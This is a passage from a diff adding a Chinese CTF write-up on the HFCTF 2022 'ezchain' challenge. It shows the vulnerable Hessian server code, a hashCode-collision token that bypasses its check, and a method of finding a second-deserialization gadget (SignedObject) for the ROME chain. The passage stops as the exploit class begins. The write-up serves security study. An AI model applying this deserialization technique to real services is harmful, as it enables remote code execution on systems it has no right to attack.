+</span></span><span style="display:flex;"><span>    <span style="color:#008000;font-weight:bold">&lt;/dependency&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#008000;font-weight:bold">&lt;/dependencies&gt;</span>
+</span></span></code></pre></div><p>jdk为8u181</p>
+<p>接下来看到Index文件</p>
+<div class="highlight"><pre tabindex="0" style="background-color:#f8f8f8;-moz-tab-size:2;-o-tab-size:2;tab-size:2;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#a2f;font-weight:bold">package</span> <span style="color:#00f;font-weight:bold">com.ctf.ezchain</span><span style="color:#666">;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a2f;font-weight:bold">import</span> <span style="color:#00f;font-weight:bold">com.caucho.hessian.io.Hessian2Input</span><span style="color:#666">;</span>
+</span></span><span style="display:flex;"><span><span style="color:#a2f;font-weight:bold">import</span> <span style="color:#00f;font-weight:bold">com.sun.net.httpserver.HttpExchange</span><span style="color:#666">;</span>
+</span></span><span style="display:flex;"><span><span style="color:#a2f;font-weight:bold">import</span> <span style="color:#00f;font-weight:bold">com.sun.net.httpserver.HttpHandler</span><span style="color:#666">;</span>
+</span></span><span style="display:flex;"><span><span style="color:#a2f;font-weight:bold">import</span> <span style="color:#00f;font-weight:bold">com.sun.net.httpserver.HttpServer</span><span style="color:#666">;</span>
+</span></span><span style="display:flex;"><span><span style="color:#a2f;font-weight:bold">import</span> <span style="color:#00f;font-weight:bold">java.io.IOException</span><span style="color:#666">;</span>
+</span></span><span style="display:flex;"><span><span style="color:#a2f;font-weight:bold">import</span> <span style="color:#00f;font-weight:bold">java.io.InputStream</span><span style="color:#666">;</span>
+</span></span><span style="display:flex;"><span><span style="color:#a2f;font-weight:bold">import</span> <span style="color:#00f;font-weight:bold">java.io.OutputStream</span><span style="color:#666">;</span>
+</span></span><span style="display:flex;"><span><span style="color:#a2f;font-weight:bold">import</span> <span style="color:#00f;font-weight:bold">java.net.InetSocketAddress</span><span style="color:#666">;</span>
+</span></span><span style="display:flex;"><span><span style="color:#a2f;font-weight:bold">import</span> <span style="color:#00f;font-weight:bold">java.util.HashMap</span><span style="color:#666">;</span>
+</span></span><span style="display:flex;"><span><span style="color:#a2f;font-weight:bold">import</span> <span style="color:#00f;font-weight:bold">java.util.Map</span><span style="color:#666">;</span>
+</span></span><span style="display:flex;"><span><span style="color:#a2f;font-weight:bold">import</span> <span style="color:#00f;font-weight:bold">java.util.Objects</span><span style="color:#666">;</span>
+</span></span><span style="display:flex;"><span><span style="color:#a2f;font-weight:bold">import</span> <span style="color:#00f;font-weight:bold">java.util.concurrent.Executors</span><span style="color:#666">;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a2f;font-weight:bold">public</span> <span style="color:#a2f;font-weight:bold">class</span> <span style="color:#00f">Index</span> <span style="color:#666">{</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a2f;font-weight:bold">public</span> <span style="color:#00a000">Index</span><span style="color:#666">()</span> <span style="color:#666">{</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#666">}</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a2f;font-weight:bold">public</span> <span style="color:#a2f;font-weight:bold">static</span> <span style="color:#0b0;font-weight:bold">void</span> <span style="color:#00a000">main</span><span style="color:#666">(</span>String<span style="color:#666">[]</span> args<span style="color:#666">)</span> <span style="color:#a2f;font-weight:bold">throws</span> Exception <span style="color:#666">{</span>
+</span></span><span style="display:flex;"><span>        System<span style="color:#666">.</span><span style="color:#b44">out</span><span style="color:#666">.</span><span style="color:#b44">println</span><span style="color:#666">(</span><span style="color:#b44">&#34;server start&#34;</span><span style="color:#666">);</span>
+</span></span><span style="display:flex;"><span>        HttpServer server <span style="color:#666">=</span> HttpServer<span style="color:#666">.</span><span style="color:#b44">create</span><span style="color:#666">(</span><span style="color:#a2f;font-weight:bold">new</span> InetSocketAddress<span style="color:#666">(</span>8090<span style="color:#666">),</span> 0<span style="color:#666">);</span>
+</span></span><span style="display:flex;"><span>        server<span style="color:#666">.</span><span style="color:#b44">createContext</span><span style="color:#666">(</span><span style="color:#b44">&#34;/&#34;</span><span style="color:#666">,</span> <span style="color:#a2f;font-weight:bold">new</span> MyHandler<span style="color:#666">());</span>
+</span></span><span style="display:flex;"><span>        server<span style="color:#666">.</span><span style="color:#b44">setExecutor</span><span style="color:#666">(</span>Executors<span style="color:#666">.</span><span style="color:#b44">newCachedThreadPool</span><span style="color:#666">());</span>
+</span></span><span style="display:flex;"><span>        server<span style="color:#666">.</span><span style="color:#b44">start</span><span style="color:#666">();</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#666">}</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a2f;font-weight:bold">static</span> <span style="color:#a2f;font-weight:bold">class</span> <span style="color:#00f">MyHandler</span> <span style="color:#a2f;font-weight:bold">implements</span> HttpHandler <span style="color:#666">{</span>
+</span></span><span style="display:flex;"><span>        MyHandler<span style="color:#666">()</span> <span style="color:#666">{</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#666">}</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#a2f;font-weight:bold">public</span> <span style="color:#0b0;font-weight:bold">void</span> <span style="color:#00a000">handle</span><span style="color:#666">(</span>HttpExchange t<span style="color:#666">)</span> <span style="color:#a2f;font-weight:bold">throws</span> IOException <span style="color:#666">{</span>
+</span></span><span style="display:flex;"><span>            String query <span style="color:#666">=</span> t<span style="color:#666">.</span><span style="color:#b44">getRequestURI</span><span style="color:#666">().</span><span style="color:#b44">getQuery</span><span style="color:#666">();</span>
+</span></span><span style="display:flex;"><span>            Map<span style="color:#666">&lt;</span>String<span style="color:#666">,</span> String<span style="color:#666">&gt;</span> queryMap <span style="color:#666">=</span> <span style="color:#a2f;font-weight:bold">this</span><span style="color:#666">.</span><span style="color:#b44">queryToMap</span><span style="color:#666">(</span>query<span style="color:#666">);</span>
+</span></span><span style="display:flex;"><span>            String response <span style="color:#666">=</span> <span style="color:#b44">&#34;Welcome to HFCTF 2022&#34;</span><span style="color:#666">;</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#a2f;font-weight:bold">if</span> <span style="color:#666">(</span>queryMap <span style="color:#666">!=</span> <span style="color:#a2f;font-weight:bold">null</span><span style="color:#666">)</span> <span style="color:#666">{</span>
+</span></span><span style="display:flex;"><span>                String token <span style="color:#666">=</span> <span style="color:#666">(</span>String<span style="color:#666">)</span>queryMap<span style="color:#666">.</span><span style="color:#b44">get</span><span style="color:#666">(</span><span style="color:#b44">&#34;token&#34;</span><span style="color:#666">);</span>
+</span></span><span style="display:flex;"><span>                String secret <span style="color:#666">=</span> <span style="color:#b44">&#34;HFCTF2022&#34;</span><span style="color:#666">;</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#a2f;font-weight:bold">if</span> <span style="color:#666">(</span>Objects<span style="color:#666">.</span><span style="color:#b44">hashCode</span><span style="color:#666">(</span>token<span style="color:#666">)</span> <span style="color:#666">==</span> secret<span style="color:#666">.</span><span style="color:#b44">hashCode</span><span style="color:#666">()</span> <span style="color:#666">&amp;&amp;</span> <span style="color:#666">!</span>secret<span style="color:#666">.</span><span style="color:#b44">equals</span><span style="color:#666">(</span>token<span style="color:#666">))</span> <span style="color:#666">{</span>
+</span></span><span style="display:flex;"><span>                    InputStream is <span style="color:#666">=</span> t<span style="color:#666">.</span><span style="color:#b44">getRequestBody</span><span style="color:#666">();</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>                    <span style="color:#a2f;font-weight:bold">try</span> <span style="color:#666">{</span>
+</span></span><span style="display:flex;"><span>                        Hessian2Input input <span style="color:#666">=</span> <span style="color:#a2f;font-weight:bold">new</span> Hessian2Input<span style="color:#666">(</span>is<span style="color:#666">);</span>
+</span></span><span style="display:flex;"><span>                        input<span style="color:#666">.</span><span style="color:#b44">readObject</span><span style="color:#666">();</span>
+</span></span><span style="display:flex;"><span>                    <span style="color:#666">}</span> <span style="color:#a2f;font-weight:bold">catch</span> <span style="color:#666">(</span>Exception var9<span style="color:#666">)</span> <span style="color:#666">{</span>
+</span></span><span style="display:flex;"><span>                        response <span style="color:#666">=</span> <span style="color:#b44">&#34;oops! something is wrong&#34;</span><span style="color:#666">;</span>
+</span></span><span style="display:flex;"><span>                    <span style="color:#666">}</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#666">}</span> <span style="color:#a2f;font-weight:bold">else</span> <span style="color:#666">{</span>
+</span></span><span style="display:flex;"><span>                    response <span style="color:#666">=</span> <span style="color:#b44">&#34;your token is wrong&#34;</span><span style="color:#666">;</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#666">}</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#666">}</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>            t<span style="color:#666">.</span><span style="color:#b44">sendResponseHeaders</span><span style="color:#666">(</span>200<span style="color:#666">,</span> <span style="color:#666">(</span><span style="color:#0b0;font-weight:bold">long</span><span style="color:#666">)</span>response<span style="color:#666">.</span><span style="color:#b44">length</span><span style="color:#666">());</span>
+</span></span><span style="display:flex;"><span>            OutputStream os <span style="color:#666">=</span> t<span style="color:#666">.</span><span style="color:#b44">getResponseBody</span><span style="color:#666">();</span>
+</span></span><span style="display:flex;"><span>            os<span style="color:#666">.</span><span style="color:#b44">write</span><span style="color:#666">(</span>response<span style="color:#666">.</span><span style="color:#b44">getBytes</span><span style="color:#666">());</span>
+</span></span><span style="display:flex;"><span>            os<span style="color:#666">.</span><span style="color:#b44">close</span><span style="color:#666">();</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#666">}</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#a2f;font-weight:bold">public</span> Map<span style="color:#666">&lt;</span>String<span style="color:#666">,</span> String<span style="color:#666">&gt;</span> <span style="color:#00a000">queryToMap</span><span style="color:#666">(</span>String query<span style="color:#666">)</span> <span style="color:#666">{</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#a2f;font-weight:bold">if</span> <span style="color:#666">(</span>query <span style="color:#666">==</span> <span style="color:#a2f;font-weight:bold">null</span><span style="color:#666">)</span> <span style="color:#666">{</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#a2f;font-weight:bold">return</span> <span style="color:#a2f;font-weight:bold">null</span><span style="color:#666">;</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#666">}</span> <span style="color:#a2f;font-weight:bold">else</span> <span style="color:#666">{</span>
+</span></span><span style="display:flex;"><span>                Map<span style="color:#666">&lt;</span>String<span style="color:#666">,</span> String<span style="color:#666">&gt;</span> result <span style="color:#666">=</span> <span style="color:#a2f;font-weight:bold">new</span> HashMap<span style="color:#666">();</span>
+</span></span><span style="display:flex;"><span>                String<span style="color:#666">[]</span> var3 <span style="color:#666">=</span> query<span style="color:#666">.</span><span style="color:#b44">split</span><span style="color:#666">(</span><span style="color:#b44">&#34;&amp;&#34;</span><span style="color:#666">);</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#0b0;font-weight:bold">int</span> var4 <span style="color:#666">=</span> var3<span style="color:#666">.</span><span style="color:#b44">length</span><span style="color:#666">;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>                <span style="color:#a2f;font-weight:bold">for</span><span style="color:#666">(</span><span style="color:#0b0;font-weight:bold">int</span> var5 <span style="color:#666">=</span> 0<span style="color:#666">;</span> var5 <span style="color:#666">&lt;</span> var4<span style="color:#666">;</span> <span style="color:#666">++</span>var5<span style="color:#666">)</span> <span style="color:#666">{</span>
+</span></span><span style="display:flex;"><span>                    String param <span style="color:#666">=</span> var3<span style="color:#666">[</span>var5<span style="color:#666">];</span>
+</span></span><span style="display:flex;"><span>                    String<span style="color:#666">[]</span> entry <span style="color:#666">=</span> param<span style="color:#666">.</span><span style="color:#b44">split</span><span style="color:#666">(</span><span style="color:#b44">&#34;=&#34;</span><span style="color:#666">);</span>
+</span></span><span style="display:flex;"><span>                    <span style="color:#a2f;font-weight:bold">if</span> <span style="color:#666">(</span>entry<span style="color:#666">.</span><span style="color:#b44">length</span> <span style="color:#666">&gt;</span> 1<span style="color:#666">)</span> <span style="color:#666">{</span>
+</span></span><span style="display:flex;"><span>                        result<span style="color:#666">.</span><span style="color:#b44">put</span><span style="color:#666">(</span>entry<span style="color:#666">[</span>0<span style="color:#666">],</span> entry<span style="color:#666">[</span>1<span style="color:#666">]);</span>
+</span></span><span style="display:flex;"><span>                    <span style="color:#666">}</span> <span style="color:#a2f;font-weight:bold">else</span> <span style="color:#666">{</span>
+</span></span><span style="display:flex;"><span>                        result<span style="color:#666">.</span><span style="color:#b44">put</span><span style="color:#666">(</span>entry<span style="color:#666">[</span>0<span style="color:#666">],</span> <span style="color:#b44">&#34;&#34;</span><span style="color:#666">);</span>
+</span></span><span style="display:flex;"><span>                    <span style="color:#666">}</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#666">}</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>                <span style="color:#a2f;font-weight:bold">return</span> result<span style="color:#666">;</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#666">}</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#666">}</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#666">}</span>
+</span></span><span style="display:flex;"><span><span style="color:#666">}</span>
+</span></span></code></pre></div><p>首先有一个简单的hashcode绕过，简单了解一下hashCode函数能够得到一个可利用的字符串<code>GeCTF2022</code></p>
+<p>接下来给了一个hession反序列化入口，很明显是让我们利用rome链进行攻击，但这里有两个难点：</p>
+<ul>
+<li>不出网，无法利用JdbcRowSetImpl进行JNDI注入</li>
+<li>无法利用<code>TemplatesImpl</code>链进行攻击</li>
+</ul>
+<p>这是由于在高版本jdk下的<code>hessian</code>反序列化过程中，在Hessian的一些限制下，导致被transient 修饰的字段<code>_tfactory</code>一直为null，后续调用<code>_tfactory.getExternalExtensionsMap()</code>会触发空指针错误。因此<code>_tfactory</code>需要赋值，并且是<code>TransformerFactoryImpl</code>的实例，这里无法满足条件从而无法利用。</p>
+<p><img src="https://cosmoslin.oss-cn-chengdu.aliyuncs.com/img2/image-20230129210347407.png" alt="image-20230129210347407"></p>
+<p>当jdk版本较低如8u40即可利用，因为该版本的<code>defineTranslectClasses</code>函数没有对<code>_tfactory</code>的值进行判断，能够完成利用。</p>
+<p>接下来我们就应该思考新的利用方式：</p>
+<h2 id="a1二次反序列化">A1.二次反序列化</h2>
+<h3 id="tabby寻找可利用类">tabby寻找可利用类</h3>
+<p>二次反序列化也就是反序列化两次，可以<strong>绕过黑名单的限制或不出网利用</strong></p>
+<p>对于rome链，它最终调用某个类的所有 getter，如果存在一个类其 getter 方法会调用 java 原生反序列化，且其反序列化内容可控即可完成二次反序列化的利用。</p>
+<p>这个预期类需要满足几个条件</p>
+<ul>
+<li>有 readobject</li>
+<li>有 getter 方法，且无参数</li>
+</ul>
+<p>这里你一定会好奇为什么不需要继承Serialize接口？</p>
+<p>在 Java 原生反序列化中，实现了 <code>java.io.Serializable</code> 接口的类才可以反序列化。同样Hessian 在获取默认序列化器时，会判断类是否实现了 Serializable 接口。</p>
+<div class="highlight"><pre tabindex="0" style="background-color:#f8f8f8;-moz-tab-size:2;-o-tab-size:2;tab-size:2;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#a2f;font-weight:bold">protected</span> Serializer <span style="color:#00a000">getDefaultSerializer</span><span style="color:#666">(</span>Class cl<span style="color:#666">)</span> <span style="color:#666">{</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#a2f;font-weight:bold">if</span> <span style="color:#666">(</span><span style="color:#a2f;font-weight:bold">this</span><span style="color:#666">.</span><span style="color:#b44">_defaultSerializer</span> <span style="color:#666">!=</span> <span style="color:#a2f;font-weight:bold">null</span><span style="color:#666">)</span> <span style="color:#666">{</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#a2f;font-weight:bold">return</span> <span style="color:#a2f;font-weight:bold">this</span><span style="color:#666">.</span><span style="color:#b44">_defaultSerializer</span><span style="color:#666">;</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#666">}</span> <span style="color:#a2f;font-weight:bold">else</span> <span style="color:#a2f;font-weight:bold">if</span> <span style="color:#666">(!</span>Serializable<span style="color:#666">.</span><span style="color:#b44">class</span><span style="color:#666">.</span><span style="color:#b44">isAssignableFrom</span><span style="color:#666">(</span>cl<span style="color:#666">)</span> <span style="color:#666">&amp;&amp;</span> <span style="color:#666">!</span><span style="color:#a2f;font-weight:bold">this</span><span style="color:#666">.</span><span style="color:#b44">_isAllowNonSerializable</span><span style="color:#666">)</span> <span style="color:#666">{</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#a2f;font-weight:bold">throw</span> <span style="color:#a2f;font-weight:bold">new</span> IllegalStateException<span style="color:#666">(</span><span style="color:#b44">&#34;Serialized class &#34;</span> <span style="color:#666">+</span> cl<span style="color:#666">.</span><span style="color:#b44">getName</span><span style="color:#666">()</span> <span style="color:#666">+</span> <span style="color:#b44">&#34; must implement java.io.Serializable&#34;</span><span style="color:#666">);</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#666">}</span> <span style="color:#a2f;font-weight:bold">else</span> <span style="color:#666">{</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#a2f;font-weight:bold">return</span> <span style="color:#a2f;font-weight:bold">new</span> JavaSerializer<span style="color:#666">(</span>cl<span style="color:#666">,</span> <span style="color:#a2f;font-weight:bold">this</span><span style="color:#666">.</span><span style="color:#b44">_loader</span><span style="color:#666">);</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#666">}</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#666">}</span>
+</span></span></code></pre></div><p>不过 Hessian 还提供了一个 <code>_isAllowNonSerializable</code> 变量用来打破这种规范，可以使用 <code>SerializerFactory#setAllowNonSerializable</code> 方法将其设置为 true，从而使未实现 Serializable 接口的类也可以序列化和反序列化。</p>
+<p>于是利用tabby进行查询</p>
+<div class="highlight"><pre tabindex="0" style="background-color:#f8f8f8;-moz-tab-size:2;-o-tab-size:2;tab-size:2;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>match path=(m1:Method)-[:CALL*..3]-&gt;(m2:Method {}) where m1.NAME =~ &#34;get.*&#34; and m1.PARAMETER_SIZE=0 and (m2.NAME =~ &#34;readObject&#34;) return path
+</span></span></code></pre></div><p><img src="https://cosmoslin.oss-cn-chengdu.aliyuncs.com/img2/image-20230130101546182.png" alt="image-20230130101546182"></p>
+<h3 id="javasecuritysignedobject">java.security.SignedObject</h3>
+<p>可以找到<code>java.security.SignedObject</code>中的<code>getObject()</code>方法</p>
+<div class="highlight"><pre tabindex="0" style="background-color:#f8f8f8;-moz-tab-size:2;-o-tab-size:2;tab-size:2;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#a2f;font-weight:bold">public</span> Object <span style="color:#00a000">getObject</span><span style="color:#666">()</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#a2f;font-weight:bold">throws</span> IOException<span style="color:#666">,</span> ClassNotFoundException
+</span></span><span style="display:flex;"><span>    <span style="color:#666">{</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#080;font-style:italic">// creating a stream pipe-line, from b to a
+</span></span></span><span style="display:flex;"><span><span style="color:#080;font-style:italic"></span>        ByteArrayInputStream b <span style="color:#666">=</span> <span style="color:#a2f;font-weight:bold">new</span> ByteArrayInputStream<span style="color:#666">(</span><span style="color:#a2f;font-weight:bold">this</span><span style="color:#666">.</span><span style="color:#b44">content</span><span style="color:#666">);</span>
+</span></span><span style="display:flex;"><span>        ObjectInput a <span style="color:#666">=</span> <span style="color:#a2f;font-weight:bold">new</span> ObjectInputStream<span style="color:#666">(</span>b<span style="color:#666">);</span>
+</span></span><span style="display:flex;"><span>        Object obj <span style="color:#666">=</span> a<span style="color:#666">.</span><span style="color:#b44">readObject</span><span style="color:#666">();</span>
+</span></span><span style="display:flex;"><span>        b<span style="color:#666">.</span><span style="color:#b44">close</span><span style="color:#666">();</span>
+</span></span><span style="display:flex;"><span>        a<span style="color:#666">.</span><span style="color:#b44">close</span><span style="color:#666">();</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#a2f;font-weight:bold">return</span> obj<span style="color:#666">;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#666">}</span>
+</span></span></code></pre></div><p>它本身是一个getter方法，其内存在原生类反序列化且反序列化内容可控</p>
+<div class="highlight"><pre tabindex="0" style="background-color:#f8f8f8;-moz-tab-size:2;-o-tab-size:2;tab-size:2;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#a2f;font-weight:bold">public</span> <span style="color:#00a000">SignedObject</span><span style="color:#666">(</span>Serializable object<span style="color:#666">,</span> PrivateKey signingKey<span style="color:#666">,</span>
+</span></span><span style="display:flex;"><span>                        Signature signingEngine<span style="color:#666">)</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#a2f;font-weight:bold">throws</span> IOException<span style="color:#666">,</span> InvalidKeyException<span style="color:#666">,</span> SignatureException <span style="color:#666">{</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#080;font-style:italic">// creating a stream pipe-line, from a to b
+</span></span></span><span style="display:flex;"><span><span style="color:#080;font-style:italic"></span>            ByteArrayOutputStream b <span style="color:#666">=</span> <span style="color:#a2f;font-weight:bold">new</span> ByteArrayOutputStream<span style="color:#666">();</span>
+</span></span><span style="display:flex;"><span>            ObjectOutput a <span style="color:#666">=</span> <span style="color:#a2f;font-weight:bold">new</span> ObjectOutputStream<span style="color:#666">(</span>b<span style="color:#666">);</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>            <span style="color:#080;font-style:italic">// write and flush the object content to byte array
+</span></span></span><span style="display:flex;"><span><span style="color:#080;font-style:italic"></span>            a<span style="color:#666">.</span><span style="color:#b44">writeObject</span><span style="color:#666">(</span>object<span style="color:#666">);</span>
+</span></span><span style="display:flex;"><span>            a<span style="color:#666">.</span><span style="color:#b44">flush</span><span style="color:#666">();</span>
+</span></span><span style="display:flex;"><span>            a<span style="color:#666">.</span><span style="color:#b44">close</span><span style="color:#666">();</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#a2f;font-weight:bold">this</span><span style="color:#666">.</span><span style="color:#b44">content</span> <span style="color:#666">=</span> b<span style="color:#666">.</span><span style="color:#b44">toByteArray</span><span style="color:#666">();</span>
+</span></span><span style="display:flex;"><span>            b<span style="color:#666">.</span><span style="color:#b44">close</span><span style="color:#666">();</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>            <span style="color:#080;font-style:italic">// now sign the encapsulated object
+</span></span></span><span style="display:flex;"><span><span style="color:#080;font-style:italic"></span>            <span style="color:#a2f;font-weight:bold">this</span><span style="color:#666">.</span><span style="color:#b44">sign</span><span style="color:#666">(</span>signingKey<span style="color:#666">,</span> signingEngine<span style="color:#666">);</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#666">}</span>
+</span></span></code></pre></div><p>显然我们可以利用该类进行二次反序列化，这里需要注意一点，为什么使用原生类反序列化可以恢复这个<code>trasient</code>修饰的变量，这是因为<code>TemplatesImpl</code>重写了<code>readObject</code>方法，手动new了一个TransformerFactoryImpl类赋值给<code>_tfactory</code>。</p>
+<div class="highlight"><pre tabindex="0" style="background-color:#f8f8f8;-moz-tab-size:2;-o-tab-size:2;tab-size:2;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#a2f;font-weight:bold">private</span> <span style="color:#0b0;font-weight:bold">void</span>  <span style="color:#00a000">readObject</span><span style="color:#666">(</span>ObjectInputStream is<span style="color:#666">)</span>
+</span></span><span style="display:flex;"><span>      <span style="color:#a2f;font-weight:bold">throws</span> IOException<span style="color:#666">,</span> ClassNotFoundException
+</span></span><span style="display:flex;"><span>    <span style="color:#666">{</span>
+</span></span><span style="display:flex;"><span>        SecurityManager security <span style="color:#666">=</span> System<span style="color:#666">.</span><span style="color:#b44">getSecurityManager</span><span style="color:#666">();</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#a2f;font-weight:bold">if</span> <span style="color:#666">(</span>security <span style="color:#666">!=</span> <span style="color:#a2f;font-weight:bold">null</span><span style="color:#666">){</span>
+</span></span><span style="display:flex;"><span>            String temp <span style="color:#666">=</span> SecuritySupport<span style="color:#666">.</span><span style="color:#b44">getSystemProperty</span><span style="color:#666">(</span>DESERIALIZE_TRANSLET<span style="color:#666">);</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#a2f;font-weight:bold">if</span> <span style="color:#666">(</span>temp <span style="color:#666">==</span> <span style="color:#a2f;font-weight:bold">null</span> <span style="color:#666">||</span> <span style="color:#666">!(</span>temp<span style="color:#666">.</span><span style="color:#b44">length</span><span style="color:#666">()==</span>0 <span style="color:#666">||</span> temp<span style="color:#666">.</span><span style="color:#b44">equalsIgnoreCase</span><span style="color:#666">(</span><span style="color:#b44">&#34;true&#34;</span><span style="color:#666">)))</span> <span style="color:#666">{</span>
+</span></span><span style="display:flex;"><span>                ErrorMsg err <span style="color:#666">=</span> <span style="color:#a2f;font-weight:bold">new</span> ErrorMsg<span style="color:#666">(</span>ErrorMsg<span style="color:#666">.</span><span style="color:#b44">DESERIALIZE_TRANSLET_ERR</span><span style="color:#666">);</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#a2f;font-weight:bold">throw</span> <span style="color:#a2f;font-weight:bold">new</span> UnsupportedOperationException<span style="color:#666">(</span>err<span style="color:#666">.</span><span style="color:#b44">toString</span><span style="color:#666">());</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#666">}</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#666">}</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#080;font-style:italic">// We have to read serialized fields first.
+</span></span></span><span style="display:flex;"><span><span style="color:#080;font-style:italic"></span>        ObjectInputStream<span style="color:#666">.</span><span style="color:#b44">GetField</span> gf <span style="color:#666">=</span> is<span style="color:#666">.</span><span style="color:#b44">readFields</span><span style="color:#666">();</span>
+</span></span><span style="display:flex;"><span>        _name <span style="color:#666">=</span> <span style="color:#666">(</span>String<span style="color:#666">)</span>gf<span style="color:#666">.</span><span style="color:#b44">get</span><span style="color:#666">(</span><span style="color:#b44">&#34;_name&#34;</span><span style="color:#666">,</span> <span style="color:#a2f;font-weight:bold">null</span><span style="color:#666">);</span>
+</span></span><span style="display:flex;"><span>        _bytecodes <span style="color:#666">=</span> <span style="color:#666">(</span><span style="color:#0b0;font-weight:bold">byte</span><span style="color:#666">[][])</span>gf<span style="color:#666">.</span><span style="color:#b44">get</span><span style="color:#666">(</span><span style="color:#b44">&#34;_bytecodes&#34;</span><span style="color:#666">,</span> <span style="color:#a2f;font-weight:bold">null</span><span style="color:#666">);</span>
+</span></span><span style="display:flex;"><span>        _class <span style="color:#666">=</span> <span style="color:#666">(</span>Class<span style="color:#666">[])</span>gf<span style="color:#666">.</span><span style="color:#b44">get</span><span style="color:#666">(</span><span style="color:#b44">&#34;_class&#34;</span><span style="color:#666">,</span> <span style="color:#a2f;font-weight:bold">null</span><span style="color:#666">);</span>
+</span></span><span style="display:flex;"><span>        _transletIndex <span style="color:#666">=</span> gf<span style="color:#666">.</span><span style="color:#b44">get</span><span style="color:#666">(</span><span style="color:#b44">&#34;_transletIndex&#34;</span><span style="color:#666">,</span> <span style="color:#666">-</span>1<span style="color:#666">);</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        _outputProperties <span style="color:#666">=</span> <span style="color:#666">(</span>Properties<span style="color:#666">)</span>gf<span style="color:#666">.</span><span style="color:#b44">get</span><span style="color:#666">(</span><span style="color:#b44">&#34;_outputProperties&#34;</span><span style="color:#666">,</span> <span style="color:#a2f;font-weight:bold">null</span><span style="color:#666">);</span>
+</span></span><span style="display:flex;"><span>        _indentNumber <span style="color:#666">=</span> gf<span style="color:#666">.</span><span style="color:#b44">get</span><span style="color:#666">(</span><span style="color:#b44">&#34;_indentNumber&#34;</span><span style="color:#666">,</span> 0<span style="color:#666">);</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#a2f;font-weight:bold">if</span> <span style="color:#666">(</span>is<span style="color:#666">.</span><span style="color:#b44">readBoolean</span><span style="color:#666">())</span> <span style="color:#666">{</span>
+</span></span><span style="display:flex;"><span>            _uriResolver <span style="color:#666">=</span> <span style="color:#666">(</span>URIResolver<span style="color:#666">)</span> is<span style="color:#666">.</span><span style="color:#b44">readObject</span><span style="color:#666">();</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#666">}</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        _tfactory <span style="color:#666">=</span> <span style="color:#a2f;font-weight:bold">new</span> TransformerFactoryImpl<span style="color:#666">();</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#666">}</span>
+</span></span></code></pre></div><h3 id="payload尝试">payload尝试</h3>
+<p>接下来就是如何构造利用链了：</p>
+<div class="highlight"><pre tabindex="0" style="background-color:#f8f8f8;-moz-tab-size:2;-o-tab-size:2;tab-size:2;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#a2f;font-weight:bold">package</span> <span style="color:#00f;font-weight:bold">exp</span><span style="color:#666">;</span>
+</span></span><span style="display:flex;"><span>
